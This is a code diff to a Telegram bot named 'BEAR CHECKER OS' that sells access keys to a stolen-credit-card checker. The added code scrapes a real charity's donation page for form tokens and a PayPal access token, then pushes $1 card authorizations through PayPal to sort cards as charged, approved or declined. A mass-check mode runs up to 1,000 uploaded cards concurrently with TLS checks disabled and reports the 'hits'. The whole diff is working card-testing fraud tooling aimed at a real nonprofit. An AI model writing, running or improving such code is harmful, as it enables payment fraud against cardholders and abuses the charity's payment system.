@@ -3,7 +3,15 @@ import os
 import secrets
 import string
 import json
+import time
+import hashlib
+import requests
+import re
+import base64
+import urllib3
+urllib3.disable_warnings()
 from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
 
 from aiogram import Bot, Dispatcher, Router, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
@@ -14,7 +22,10 @@ from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
 from aiogram.exceptions import TelegramBadRequest
 
-# --- IMPORT YOUR EXISTING BACKEND ---
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from user_agent import generate_user_agent
+
+# --- IMPORT YOUR EXISTING SHOPIFY BACKEND ---
 from api import process_card_async, parse_cc_string, extract_clean_response
 from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info
 
@@ -28,11 +39,14 @@ dp.include_router(router)
 
 PREMIUM_FILE = "premium.json"
 KEYS_FILE = "keys.json"
+ACTIVE_JOBS = {} # For stopping mass checks
 
 # --- DATABASE LOGIC ---
 def load_db(filename):
     if os.path.exists(filename):
-        with open(filename, "r") as f: return json.load(f)
+        try:
+            with open(filename, "r") as f: return json.load(f)
+        except: return {}
     return {}
 
 def save_db(filename, data):
@@ -51,127 +65,215 @@ def check_tier(user_id):
 
 # --- FINITE STATE MACHINE (FSM) ---
 class AppStates(StatesGroup):
-    waiting_for_card = State()
+    waiting_for_shopify = State()
+    waiting_for_paypal = State()
+    waiting_for_mass_file = State()
     waiting_for_key = State()
 
-# --- DYNAMIC UI MENUS ---
+# --- PAYPAL GATEWAY LOGIC ---
+def check_cc_paypal(ccx):
+    try:
+        ccx = ccx.strip()
+        parts = ccx.split("|")
+        if len(parts) < 4: return "ERROR", "Invalid Format"
+       
+        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
+        us, user = generate_user_agent(), generate_user_agent()
+        
+        session = requests.Session()
+        session.verify = False
+        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+            
+        with session as r:
+            headers_get = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': us}
+            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=20)
+            if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
+                return "ERROR", "Cloudflare Block"
+            
+            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
+            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
+            m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
+            m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
+            
+            if not all([m1, m2, m3, m4]): return "ERROR", "Page Load Error"
+            
+            id_form1, id_form2, nonec, enc = m1.group(1), m2.group(1), m3.group(1), m4.group(1)
+            dec = base64.b64decode(enc).decode('utf-8')
+            m_au = re.search(r'"accessToken":"(.*?)"', dec)
+            if not m_au: return "ERROR", "Token Error"
+            au = m_au.group(1)
+            
+            data_multipart = MultipartEncoder({
+                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1),
+                'give-form-id': (None, id_form2), 'give-form-title': (None, ''),
+                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
+                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
+                'give-form-minimum': (None, '1'), 'give-form-maximum': (None, '999999.99'),
+                'give-form-hash': (None, nonec), 'give-price-id': (None, '3'),
+                'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
+                '_give_is_donation_recurring': (None, '0'),
+                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+                'give-amount': (None, '1'), 'give_stripe_payment_method': (None, ''),
+                'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'xunarch'),
+                'give_last': (None, 'xunarch'), 'give_email': (None, 'xunarch@gmail.com'),
+                'card_name': (None, 'xunarch'), 'card_exp_month': (None, ''),
+                'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
+            })
+            
+            headers_multipart = {'content-type': data_multipart.content_type, 'user-agent': us}
+            params = {'action': 'give_paypal_commerce_create_order'}
+            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=20)
+            tok = response.json()['data']['id']
+            
+            headers_paypal = {
+                'authorization': f'Bearer {au}', 'content-type': 'application/json',
+                'user-agent': user, 'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835'
+            }
+            json_data_paypal = {
+                'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
+                'application_context': {'vault': False}
+            }
+            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=20, verify=False)
+            
+            params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
+            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=20, verify=False)
+            text_up = response.text.upper()
+
+            if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'APPROVEGUESTPAYMENTWITHCREDITCARD', 'THANK YOU FOR DONATION', '"SUCCESS":TRUE']):
+                if '"ERRORS"' not in text_up and '"ERROR"' not in text_up: return "CHARGED", "Thank you for donation"
+            if 'INSUFFICIENT_FUNDS' in text_up: return "APPROVED", "INSUFFICIENT_FUNDS"
+            elif 'CVV2_FAILURE' in text_up: return "APPROVED", "CVV2_FAILURE"
+            elif 'INVALID_SECURITY_CODE' in text_up: return "APPROVED", "INVALID_SECURITY_CODE"
+            elif 'IS3SECUREREQUIRED' in text_up or 'OTP' in text_up: return "APPROVED", "3D_REQUIRED"
+            elif 'DO_NOT_HONOR' in text_up: return "DECLINED", "Do not honor"
+            elif 'GENERIC_DECLINE' in text_up: return "DECLINED", "GENERIC_DECLINE"
+            else:
+                try: return "DECLINED", str(response.json().get('data', {}).get('error', 'Transaction Failed'))
+                except: return "DECLINED", "Transaction Failed"
+                
+    except Exception as e:
+        msg = str(e)
+        if "timeout" in msg.lower(): return "ERROR", "Read Timeout"
+        return "ERROR", f"Req Error: {msg[:30]}"
+
+# --- NESTED DYNAMIC UI MENUS ---
+
 def kb_home(user_id):
+    """Level 1: The Main Dashboard"""
     is_admin = str(user_id) == str(ADMIN_ID)
-    
     kb = [
-        [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_single"),
-         InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_mass")],
+        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify")],
+        [InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
         [InlineKeyboardButton(text="👤 My Profile", callback_data="ui_plan"),
          InlineKeyboardButton(text="🔑 Redeem Key", callback_data="ui_redeem")]
     ]
-    
     if is_admin:
         kb.append([InlineKeyboardButton(text="⚙️ Admin Control Panel", callback_data="ui_admin")])
-        
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
-def kb_back():
+def kb_shopify():
+    """Level 2: Shopify Options"""
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]
+        [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_shopify_single"),
+         InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_shopify_mass")],
+        [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
     ])
+
+def kb_paypal():
+    """Level 2: PayPal Options"""
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_paypal_single"),
+         InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_paypal_mass")],
+        [InlineKeyboardButton(text="🛑 Stop Active Mass Check", callback_data="cmd_stop")],
+        [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
+    ])
+
+def kb_back():
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]])
 
 def kb_admin():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎟 Gen 1-Day Key", callback_data="gen_1d"),
-         InlineKeyboardButton(text="🎟 Gen 7-Day Key", callback_data="gen_7d")],
-        [InlineKeyboardButton(text="🎟 Gen 1-Month Key", callback_data="gen_30d"),
-         InlineKeyboardButton(text="🎟 Gen Lifetime Key", callback_data="gen_life")],
+        [InlineKeyboardButton(text="🎟 Gen 1-Day", callback_data="gen_1d"), InlineKeyboardButton(text="🎟 Gen 7-Day", callback_data="gen_7d")],
+        [InlineKeyboardButton(text="🎟 Gen 1-Month", callback_data="gen_30d"), InlineKeyboardButton(text="🎟 Gen Lifetime", callback_data="gen_life")],
         [InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]
     ])
 
 async def clean_chat(message: Message):
-    """Silently deletes user inputs to keep the chat looking like a clean app."""
     try: await message.delete()
     except TelegramBadRequest: pass
 
-# --- MAIN DASHBOARD ---
+# --- MAIN DASHBOARD (LEVEL 1) ---
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     await clean_chat(message)
-    
-    # Check memory for an old dashboard and delete it
     data = await state.get_data()
-    old_msg_id = data.get("dash_id")
-    if old_msg_id:
-        try: await bot.delete_message(chat_id=message.chat.id, message_id=old_msg_id)
+    if data.get("dash_id"):
+        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
         except TelegramBadRequest: pass
-
     await state.clear()
     
     tier = check_tier(message.from_user.id)
-    text = (
-        f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"Welcome, <b>{message.from_user.first_name}</b>.\n"
-        f"Access Level: {tier}\n\n"
-        f"<i>Select a module to deploy:</i>"
-    )
+    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
+            f"Welcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>")
     new_msg = await message.answer(text, reply_markup=kb_home(message.from_user.id))
-    
-    # Save the new dashboard ID so we can delete it next time
     await state.update_data(dash_id=new_msg.message_id)
 
 @router.callback_query(F.data == "ui_home")
 async def nav_home(callback: CallbackQuery, state: FSMContext):
-    # Retrieve the old dash ID before clearing state
-    data = await state.get_data()
-    old_msg_id = data.get("dash_id")
-    
+    dash_id = (await state.get_data()).get("dash_id")
     await state.clear()
-    
-    # Put the dash ID back in state
-    if old_msg_id:
-        await state.update_data(dash_id=old_msg_id)
+    if dash_id: await state.update_data(dash_id=dash_id)
 
     tier = check_tier(callback.from_user.id)
-    text = (
-        f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"Welcome, <b>{callback.from_user.first_name}</b>.\n"
-        f"Access Level: {tier}\n\n"
-        f"<i>Select a module to deploy:</i>"
-    )
+    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
+            f"Welcome, <b>{callback.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>")
     await callback.message.edit_text(text, reply_markup=kb_home(callback.from_user.id))
     await callback.answer()
 
-# --- PREMIUM FEATURE GATES ---
-@router.callback_query(F.data == "ui_single")
-async def nav_single(callback: CallbackQuery, state: FSMContext):
-    if check_tier(callback.from_user.id) == "🆓 FREE":
-        return await callback.answer("⛔️ PREMIUM EXCLUSIVE!\n\nYou must redeem a key to use the checker modules.", show_alert=True)
-        
-    await callback.message.edit_text(
-        "💳 <b>SINGLE CARD TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        "Please paste your card details below.\n"
-        "Format: <code>CC|MM|YYYY|CVV</code>",
-        reply_markup=kb_back()
-    )
-    await state.set_state(AppStates.waiting_for_card)
-    await callback.answer()
 
-@router.callback_query(F.data == "ui_mass")
-async def nav_mass(callback: CallbackQuery):
-    if check_tier(callback.from_user.id) == "🆓 FREE":
-        return await callback.answer("⛔️ PREMIUM EXCLUSIVE!\n\nYou must redeem a key to use the mass checker.", show_alert=True)
-        
+# --- GATEWAY MENUS (LEVEL 2) ---
+@router.callback_query(F.data == "menu_shopify")
+async def menu_shopify(callback: CallbackQuery):
     await callback.message.edit_text(
-        "📁 <b>MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        "<i>Mass check module is currently initializing. Please use the Single Check terminal.</i>",
-        reply_markup=kb_back()
+        "🟢 <b>SHOPIFY GATEWAY</b>\n━━━━━━━━━━━━━━━━━━\n\n<i>Select a module to deploy:</i>", 
+        reply_markup=kb_shopify()
     )
     await callback.answer()
 
-# --- SINGLE CHECKER LOGIC ---
-@router.message(AppStates.waiting_for_card)
-async def process_card(message: Message, state: FSMContext):
+@router.callback_query(F.data == "menu_paypal")
+async def menu_paypal(callback: CallbackQuery):
+    await callback.message.edit_text(
+        "🔵 <b>PAYPAL GATEWAY</b>\n━━━━━━━━━━━━━━━━━━\n\n<i>Select a module to deploy:</i>", 
+        reply_markup=kb_paypal()
+    )
+    await callback.answer()
+
+
+# --- PREMIUM GATES ---
+def gatekeeper(callback: CallbackQuery):
+    if check_tier(callback.from_user.id) == "🆓 FREE": return True
+    return False
+
+# --- SHOPIFY MODULES (LEVEL 3) ---
+@router.callback_query(F.data == "ui_shopify_single")
+async def nav_shopify_single(callback: CallbackQuery, state: FSMContext):
+    if gatekeeper(callback): return await callback.answer("⛔️ PREMIUM EXCLUSIVE!\nRedeem a key to use this.", show_alert=True)
+    await callback.message.edit_text("🟢 <b>SHOPIFY: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
+    await state.set_state(AppStates.waiting_for_shopify)
+    await callback.answer()
+
+@router.callback_query(F.data == "ui_shopify_mass")
+async def nav_shopify_mass(callback: CallbackQuery):
+    if gatekeeper(callback): return await callback.answer("⛔️ PREMIUM EXCLUSIVE!\nRedeem a key to use this.", show_alert=True)
+    await callback.message.edit_text("🟢 <b>SHOPIFY: MASS CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\n<i>This module is currently initializing in the backend. Please use the Single Check terminal or PayPal Mass Check.</i>", reply_markup=kb_back())
+    await callback.answer()
+
+@router.message(AppStates.waiting_for_shopify)
+async def process_shopify(message: Message, state: FSMContext):
     await clean_chat(message)
     card_data = message.text.strip()
-    
     try: parts = parse_cc_string(card_data)
     except ValueError:
         err = await message.answer("⚠️ <b>Invalid Format.</b> Use CC|MM|YYYY|CVV")
@@ -179,63 +281,142 @@ async def process_card(message: Message, state: FSMContext):
         await err.delete()
         return
 
-    # Delete the old menu message completely so the new loading screen drops fresh at the bottom
     data = await state.get_data()
-    old_msg_id = data.get("dash_id")
-    if old_msg_id:
-        try: await bot.delete_message(chat_id=message.chat.id, message_id=old_msg_id)
-        except TelegramBadRequest: pass
+    if data.get("dash_id"):
+        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
+        except: pass
 
-    loading = await message.answer(
-        f"⏳ <b>AUTHORIZING CONNECTION...</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"Target: <code>{card_data}</code>\n"
-        f"Status: <i>Pinging Shopify Gateway...</i>",
-        reply_markup=kb_back()
-    )
-    
-    # Save this new loading screen as the new "dashboard"
+    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: Shopify Auto", reply_markup=kb_back())
     await state.update_data(dash_id=loading.message_id)
 
     try:
-        success, raw_message, gateway, price, currency = await process_card_async(
-            parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com", proxy_str=None
-        )
-
+        success, raw_message, gateway, price, currency = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com", proxy_str=None)
         category = classify_result(success, raw_message)
         clean_msg = extract_clean_response(raw_message)
         if category == 'charged': clean_msg = 'ORDER_PLACED'
 
         status_emoji = "🔥 <b>CHARGED</b>" if category == 'charged' else "✅ <b>APPROVED</b>" if category == 'approved' else "❌ <b>DECLINED</b>"
-
-        result_text = (
-            f"{status_emoji}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"💳 <b>Card:</b> <code>{card_data}</code>\n"
-            f"ツ <b>Response:</b> <code>{clean_msg}</code>\n"
-            f"キ <b>Gateway:</b> {gateway or 'Shopify'}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"<i>Powered by BEAR OS</i>"
-        )
+        result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{clean_msg}</code>\nキ <b>Gateway:</b> {gateway or 'Shopify'}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
         await loading.edit_text(result_text, reply_markup=kb_back())
-        
     except Exception as e:
-        await loading.edit_text(f"⚠️ <b>Fatal Error:</b> {str(e)}", reply_markup=kb_back())
+        await loading.edit_text(f"⚠️ <b>Error:</b> {str(e)}", reply_markup=kb_back())
 
-    # We clear the state but KEEP the dash_id so the back button knows what to do
     dash_id = (await state.get_data()).get("dash_id")
     await state.clear()
-    if dash_id:
-        await state.update_data(dash_id=dash_id)
+    if dash_id: await state.update_data(dash_id=dash_id)
+
+
+# --- PAYPAL MODULES (LEVEL 3) ---
+@router.callback_query(F.data == "ui_paypal_single")
+async def nav_paypal_single(callback: CallbackQuery, state: FSMContext):
+    if gatekeeper(callback): return await callback.answer("⛔️ PREMIUM EXCLUSIVE!\nRedeem a key to use this.", show_alert=True)
+    await callback.message.edit_text("🔵 <b>PAYPAL: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
+    await state.set_state(AppStates.waiting_for_paypal)
+    await callback.answer()
+
+@router.callback_query(F.data == "ui_paypal_mass")
+async def nav_paypal_mass(callback: CallbackQuery, state: FSMContext):
+    if gatekeeper(callback): return await callback.answer("⛔️ PREMIUM EXCLUSIVE!\nRedeem a key to use this.", show_alert=True)
+    await callback.message.edit_text("🔵 <b>PAYPAL: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Make sure the file format is CC|MM|YYYY|CVV</i>", reply_markup=kb_back())
+    await state.set_state(AppStates.waiting_for_mass_file)
+    await callback.answer()
+
+@router.message(AppStates.waiting_for_paypal)
+async def process_paypal(message: Message, state: FSMContext):
+    await clean_chat(message)
+    card_data = message.text.strip()
+    
+    data = await state.get_data()
+    if data.get("dash_id"):
+        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
+        except: pass
+
+    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: PayPal Braintree", reply_markup=kb_back())
+    await state.update_data(dash_id=loading.message_id)
+
+    status, response = await asyncio.to_thread(check_cc_paypal, card_data)
+    status_emoji = "🔥 <b>CHARGED</b>" if status == "CHARGED" else "✅ <b>APPROVED</b>" if status == "APPROVED" else "❌ <b>DECLINED</b>"
+
+    async with aiohttp.ClientSession() as session:
+        brand, bank, country, level, type_cc, flag = await get_bin_info(session, card_data.split('|')[0][:6])
+
+    result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{response}</code>\nキ <b>Gateway:</b> PayPal Braintree\n零 <b>Info:</b> {fmt_info(brand, type_cc, level)}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
+    await loading.edit_text(result_text, reply_markup=kb_back())
+
+    dash_id = (await state.get_data()).get("dash_id")
+    await state.clear()
+    if dash_id: await state.update_data(dash_id=dash_id)
+
+@router.message(AppStates.waiting_for_mass_file, F.document)
+async def process_mass_file(message: Message, state: FSMContext):
+    await clean_chat(message)
+    user_id = message.from_user.id
+    
+    data = await state.get_data()
+    if data.get("dash_id"):
+        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
+        except: pass
+
+    file_id = message.document.file_id
+    file_info = await bot.get_file(file_id)
+    downloaded = await bot.download_file(file_info.file_path)
+    
+    ccs = downloaded.read().decode('utf-8').splitlines()
+    ccs = [l.strip() for l in ccs if l.strip()]
+    if len(ccs) > 1000: ccs = ccs[:1000]
+
+    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
+    ACTIVE_JOBS[job_id] = True
+    
+    total = len(ccs)
+    prog_msg = await message.answer(f"🚀 <b>Mass Check Running</b> [ID: {job_id}]\nChecked: 0/{total}\n🔥 Charged: 0 | ✅ Approved: 0", reply_markup=kb_back())
+    await state.update_data(dash_id=prog_msg.message_id)
+
+    checked, approved, charged, declined = 0, 0, 0, 0
+    
+    async def process_single(cc):
+        nonlocal checked, approved, charged, declined
+        if not ACTIVE_JOBS.get(job_id): return
+        status, response = await asyncio.to_thread(check_cc_paypal, cc)
+        checked += 1
+        if status == "CHARGED": charged += 1
+        elif status == "APPROVED": approved += 1
+        else: declined += 1
+        if status in ["CHARGED", "APPROVED"]:
+            await message.answer(f"✅ <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: {response}")
+
+    sem = asyncio.Semaphore(5)
+    async def sem_task(cc):
+        async with sem: await process_single(cc)
+
+    tasks = []
+    for i, cc in enumerate(ccs):
+        if not ACTIVE_JOBS.get(job_id): break
+        tasks.append(asyncio.create_task(sem_task(cc)))
+        if len(tasks) >= 5 or i == len(ccs)-1:
+            await asyncio.gather(*tasks)
+            tasks = []
+            if ACTIVE_JOBS.get(job_id) and checked % 10 == 0:
+                try: await prog_msg.edit_text(f"🚀 <b>Mass Check Running</b> [ID: {job_id}]\nChecked: {checked}/{total}\n🔥 Charged: {charged} | ✅ Approved: {approved}", reply_markup=kb_back())
+                except: pass
+
+    ACTIVE_JOBS.pop(job_id, None)
+    await prog_msg.edit_text(f"🏁 <b>Mass Check Finished</b>\nChecked: {checked}/{total}\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}", reply_markup=kb_back())
+    
+    dash_id = (await state.get_data()).get("dash_id")
+    await state.clear()
+    if dash_id: await state.update_data(dash_id=dash_id)
+
+@router.callback_query(F.data == "cmd_stop")
+async def stop_mass(callback: CallbackQuery):
+    if gatekeeper(callback): return await callback.answer("⛔️ PREMIUM EXCLUSIVE!", show_alert=True)
+    for job in list(ACTIVE_JOBS.keys()): ACTIVE_JOBS[job] = False
+    await callback.answer("🛑 Sent stop signal to all mass checks.", show_alert=True)
 
 # --- KEY REDEMPTION ---
 @router.callback_query(F.data == "ui_redeem")
 async def nav_redeem(callback: CallbackQuery, state: FSMContext):
-    await callback.message.edit_text(
-        "🔑 <b>KEY REDEMPTION</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        "Please paste your license key in the chat.",
-        reply_markup=kb_back()
-    )
+    await callback.message.edit_text("🔑 <b>KEY REDEMPTION</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease paste your license key in the chat.", reply_markup=kb_back())
     await state.set_state(AppStates.waiting_for_key)
     await callback.answer()
 
@@ -243,7 +424,6 @@ async def nav_redeem(callback: CallbackQuery, state: FSMContext):
 async def process_key(message: Message, state: FSMContext):
     await clean_chat(message)
     key_input = message.text.strip().upper()
-    
     keys_db = load_db(KEYS_FILE)
     if key_input not in keys_db:
         warning = await message.answer("❌ <b>Invalid or Expired Key.</b>")
@@ -263,22 +443,16 @@ async def process_key(message: Message, state: FSMContext):
     del keys_db[key_input]
     save_db(KEYS_FILE, keys_db)
     
-    # Delete old dashboard
     data = await state.get_data()
-    old_msg_id = data.get("dash_id")
-    if old_msg_id:
-        try: await bot.delete_message(chat_id=message.chat.id, message_id=old_msg_id)
-        except TelegramBadRequest: pass
+    if data.get("dash_id"):
+        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
+        except: pass
 
     success = await message.answer(f"🎉 <b>Redeemed!</b> You have Premium until {expiry.strftime('%Y-%m-%d')}")
     await state.clear()
     
-    new_dash = await message.answer(
-        f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nAccess Level: 💎 PREMIUM\n\n<i>Select a module to deploy:</i>",
-        reply_markup=kb_home(message.from_user.id)
-    )
+    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nAccess Level: 💎 PREMIUM\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
     await state.update_data(dash_id=new_dash.message_id)
-    
     await asyncio.sleep(3)
     await success.delete()
 
@@ -287,50 +461,28 @@ async def process_key(message: Message, state: FSMContext):
 async def nav_plan(callback: CallbackQuery):
     tier = check_tier(callback.from_user.id)
     db = load_db(PREMIUM_FILE)
-    
     if str(callback.from_user.id) == str(ADMIN_ID): expiry_text = "Never (Admin Override)"
-    elif str(callback.from_user.id) in db:
-        expiry = datetime.fromisoformat(db[str(callback.from_user.id)])
-        expiry_text = expiry.strftime('%Y-%m-%d %H:%M:%S')
+    elif str(callback.from_user.id) in db: expiry_text = datetime.fromisoformat(db[str(callback.from_user.id)]).strftime('%Y-%m-%d %H:%M:%S')
     else: expiry_text = "N/A"
 
-    await callback.message.edit_text(
-        f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        f"<b>Telegram ID:</b> <code>{callback.from_user.id}</code>\n"
-        f"<b>Access Level:</b> {tier}\n"
-        f"<b>Expires On:</b> <code>{expiry_text}</code>\n\n"
-        f"<i>To upgrade, click Redeem Key or contact the admin.</i>",
-        reply_markup=kb_back()
-    )
+    await callback.message.edit_text(f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Telegram ID:</b> <code>{callback.from_user.id}</code>\n<b>Access Level:</b> {tier}\n<b>Expires On:</b> <code>{expiry_text}</code>\n\n<i>To upgrade, click Redeem Key.</i>", reply_markup=kb_back())
     await callback.answer()
 
 @router.callback_query(F.data == "ui_admin")
 async def nav_admin(callback: CallbackQuery):
     if str(callback.from_user.id) != str(ADMIN_ID): return await callback.answer("⛔️ Unauthorized.", show_alert=True)
-    await callback.message.edit_text(
-        "⚙️ <b>ADMIN TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n\nGenerate access keys below:",
-        reply_markup=kb_admin()
-    )
+    await callback.message.edit_text("⚙️ <b>ADMIN TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n\nGenerate access keys below:", reply_markup=kb_admin())
     await callback.answer()
 
 @router.callback_query(F.data.startswith("gen_"))
 async def admin_gen(callback: CallbackQuery):
     if str(callback.from_user.id) != str(ADMIN_ID): return
     duration = callback.data.split("_")[1]
-    
     new_key = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
-    
     db = load_db(KEYS_FILE)
     db[new_key] = duration
     save_db(KEYS_FILE, db)
-    
-    await callback.message.edit_text(
-        f"🎟 <b>LICENSE CREATED</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        f"<b>Key:</b> <code>{new_key}</code>\n"
-        f"<b>Duration:</b> {duration.upper()}\n\n"
-        f"<i>Tap the key to copy it. Send it to your user.</i>",
-        reply_markup=kb_back()
-    )
+    await callback.message.edit_text(f"🎟 <b>LICENSE CREATED</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Key:</b> <code>{new_key}</code>\n<b>Duration:</b> {duration.upper()}\n\n<i>Tap the key to copy it.</i>", reply_markup=kb_back())
     await callback.answer()
 
 async def main():
